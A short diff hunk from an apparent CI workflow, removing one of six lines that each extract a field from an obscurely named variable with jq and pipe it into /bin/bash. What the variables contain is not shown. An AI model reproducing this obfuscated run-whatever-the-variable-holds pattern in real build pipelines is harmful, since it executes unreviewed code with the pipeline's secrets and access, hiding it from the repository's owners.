@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$vf65" | jq -r .b1 | /bin/bash
           echo $dk46 | jq -r .ia69137 | /bin/bash
           echo $i81772 | jq -r .p6443 | /bin/bash
-          echo $umfee8 | jq -r .uiu76 | /bin/bash
           echo $sx9 | jq -r .sw87883 | /bin/bash
           printf '%s' "$cwwh2841" | jq -r .ex4 | /bin/bash
 
